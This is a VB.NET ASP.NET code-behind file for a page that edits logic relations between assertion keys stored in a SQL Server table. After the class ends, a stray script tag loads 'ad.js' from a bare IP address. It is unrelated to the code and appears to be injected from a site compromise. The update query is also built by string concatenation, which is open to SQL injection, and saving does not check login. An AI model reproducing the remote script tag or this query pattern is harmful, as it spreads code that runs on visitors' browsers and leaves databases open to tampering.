Imports System.Data
Imports System.Data.SqlClient

Public Class modificationlogic
    Inherits System.Web.UI.Page

#Region " Web 窗体设计器生成的代码 "

    '该调用是 Web 窗体设计器所必需的。
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Form2 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents Form1 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents lblLogKey As System.Web.UI.WebControls.Label
    Protected WithEvents ddlstLogKey As System.Web.UI.WebControls.DropDownList
    Protected WithEvents lblDefFrom As System.Web.UI.WebControls.Label
    Protected WithEvents ddlstDefFrom As System.Web.UI.WebControls.DropDownList
    Protected WithEvents lblDefTo As System.Web.UI.WebControls.Label
    Protected WithEvents ddlstDefTo As System.Web.UI.WebControls.DropDownList
    Protected WithEvents lblLogRel As System.Web.UI.WebControls.Label
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnLogOr As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnLogAnd As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnLogMtx As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnLogImp As System.Web.UI.WebControls.RadioButton
    Protected WithEvents btnSave As System.Web.UI.WebControls.Button
    Protected WithEvents btnCancel As System.Web.UI.WebControls.Button
    Protected WithEvents btnSearch As System.Web.UI.WebControls.Button
    Protected WithEvents timetext As System.Web.UI.WebControls.Label

    '注意: 以下占位符声明是 Web 窗体设计器所必需的。
    '不要删除或移动它。
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: 此方法调用是 Web 窗体设计器所必需的
        '不要使用代码编辑器修改它。
        InitializeComponent()
    End Sub

#End Region

    Private Sub Initial(ByVal index As Integer)  ' 初始化页面显示
        Me.ddlstDefFrom.SelectedIndex = index
        Me.ddlstDefTo.SelectedIndex = index
        Dim temp = Session("myDateSet").Tables("logic").Rows(index).Item("logicrelation")
        If temp = "1" Then
            Me.rbtnLogAnd.Checked = False
            Me.rbtnLogImp.Checked = False
            Me.rbtnLogMtx.Checked = False
            Me.rbtnLogOr.Checked = True
        ElseIf temp = "2" Then
            Me.rbtnLogOr.Checked = False
            Me.rbtnLogImp.Checked = False
            Me.rbtnLogMtx.Checked = False
            Me.rbtnLogAnd.Checked = True
        ElseIf temp = "3" Then
            Me.rbtnLogAnd.Checked = False
            Me.rbtnLogImp.Checked = False
            Me.rbtnLogOr.Checked = False
            Me.rbtnLogMtx.Checked = True
        Else
            Me.rbtnLogAnd.Checked = False
            Me.rbtnLogOr.Checked = False
            Me.rbtnLogMtx.Checked = False
            Me.rbtnLogImp.Checked = True
        End If
    End Sub

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '在此处放置初始化页的用户代码
        Me.lblWarning.Visible = False
        Me.timetext.Text = DateTime.Now.ToString()
        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "您还没登录，请先登录"
        Else
            Me.lblHint.Text = "您好， " + Session("UserName")
        End If

        If Not IsPostBack Then  ' 用户x第一次打开页面时
            Dim strSql As String
            Dim mySqlConn As New SqlConnection(Me.Application("DataBase"))
            Try
                mySqlConn.Open()

                Dim mySqlAdapter As New SqlDataAdapter("select * from logic", mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "logic")

                Me.Session("myDateSet") = myDateSet
                If myDateSet.Tables("logic").Rows.Count = 0 Then
                    Me.lblWarning.Text = "提醒：没有关系逻辑存在"
                    Me.lblWarning.Visible = True
                    mySqlConn.Close()
                    Exit Sub
                End If

                Me.ddlstLogKey.DataSource = myDateSet.Tables("logic").DefaultView
                Me.ddlstLogKey.DataValueField = "logickey"
                Me.ddlstLogKey.DataBind()

                Me.ddlstDefFrom.DataSource = myDateSet.Tables("logic").DefaultView
                Me.ddlstDefFrom.DataValueField = "fromassertionkey"
                Me.ddlstDefFrom.DataBind()

                Me.ddlstDefTo.DataSource = myDateSet.Tables("logic").DefaultView
                Me.ddlstDefTo.DataValueField = "toassertionkey"
                Me.ddlstDefTo.DataBind()

                Initial(0)
                Me.Session("index") = 0
                mySqlConn.Close()
            Catch ex As SqlException
                Throw ex
                'Response.Redirect("error.htm") ' 错误提示
            Finally
            End Try
        End If
    End Sub

    Private Sub btnSearch_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSearch.Click
        If (Me.ddlstLogKey.Items.Count = 0) Then
            Me.lblWarning.Text = "提醒：没有关系断言存在"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Initial(Me.Session("index"))
    End Sub

    Private Sub btnSave_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSave.Click
        If (Me.ddlstLogKey.Items.Count = 0) Then
            Me.lblWarning.Text = "提醒：没有关系断言存在"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim mySqlComm As SqlCommand

        ' 获取关系间逻辑信息保存在chrLogRef中
        Dim chrLogRel As Char
        If Me.rbtnLogOr.Checked = True Then
            chrLogRel = "1"
        ElseIf Me.rbtnLogAnd.Checked = True Then
            chrLogRel = "2"
        ElseIf Me.rbtnLogMtx.Checked = True Then
            chrLogRel = "3"
        Else
            chrLogRel = "4"
        End If
        Try
            ' 修改数据项
            strSql = "update logic set fromassertionkey='" + Me.ddlstDefFrom.SelectedValue.Trim() + _
                "',toassertionkey= '" + Me.ddlstDefTo.SelectedValue.Trim() + "',logicrelation= '" + chrLogRel + _
                "' where logickey='" + Me.ddlstLogKey.SelectedValue.Trim() + "'"
            mySqlComm = New SqlCommand(strSql, mySqlConn)

            mySqlConn.Open()
            If (mySqlComm.ExecuteNonQuery() > 0) Then
                Me.lblWarning.Text = "恭喜：修改关系断言成功" + Me.ddlstLogKey.SelectedValue.Trim() + "成功"
                Me.lblWarning.Visible = True
                Dim mySqlAdapter As New SqlDataAdapter("select * from logic", mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "logic")
                Me.Session("myDateSet") = myDateSet
                Initial(Me.Session("index"))
            Else
                Me.lblWarning.Text = "警告：由于某种原因修改关系断言失败，可能你没有权限"
                Me.lblWarning.Visible = True
            End If
            mySqlConn.Close()
        Catch ex As SqlException
            Throw ex
            'Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try
    End Sub

    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
        Me.lblWarning.Visible = False
        Me.ddlstLogKey.SelectedIndex = Me.Session("index")
        Initial(Me.Session("index"))
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
